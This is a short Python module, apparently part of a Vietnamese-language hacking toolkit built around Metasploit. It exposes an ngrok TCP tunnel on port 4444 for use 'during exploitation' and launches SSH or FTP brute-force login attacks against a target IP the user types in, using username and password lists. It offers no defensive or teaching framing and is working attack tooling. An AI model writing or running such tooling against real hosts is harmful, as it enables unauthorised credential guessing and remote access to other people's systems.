#!/usr/bin/env python
# coding: utf-8

import os
import time
import requests
from .modules import Colors, FrameworkManager, slowprint

class AuxiliaryExploits:
    @staticmethod
    def show_public_ip():
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            print(f"\n{Colors.WHITE}[IP] Public IP Hiện Tại Của Bạn: {Colors.PURPLE}{ip}\n")
        except Exception:
            print(f"\n{Colors.RED}[!] Không thể kiểm tra Public IP (Lỗi kết nối mạng).\n")

    @staticmethod
    def start_ngrok():
        print(f"{Colors.YELLOW}[!] Đang kích hoạt Ngrok TCP trên cổng 4444...")
        print(f"{Colors.RED}[!] KHÔNG ĐÓNG cửa sổ terminal Ngrok trong quá trình khai thác!")
        time.sleep(1)
        if os.name == 'nt': # Windows
            os.system("start cmd /k ngrok tcp 4444")
        else: # Linux / Termux
            os.system("ngrok tcp 4444 > /dev/null 2>&1 &")
            print(f"{Colors.GREEN}[✔] Ngrok đã được đẩy chạy ngầm.")

    @staticmethod
    def run_bruteforce(service_type):
        rhost = input(f"{Colors.WHITE}[+] Nhập IP Mục tiêu (RHOSTS): ")
        user_list = input(f"{Colors.WHITE}[+] Đường dẫn danh sách USERNAME: ")
        pass_list = input(f"{Colors.WHITE}[+] Đường dẫn danh sách PASSWORD: ")
        
        module = "auxiliary/scanner/ssh/ssh_login" if service_type == "ssh" else "auxiliary/scanner/ftp/ftp_login"
        
        cmd = f'msfconsole -q -x "use {module}; set RHOSTS {rhost}; set USER_FILE {user_list}; set PASS_FILE {pass_list}; exploit; exit"'
        print(f"{Colors.GREEN}[*] Đang tiến hành tấn công dò quét thông tin...")
        FrameworkManager.run_command(cmd)
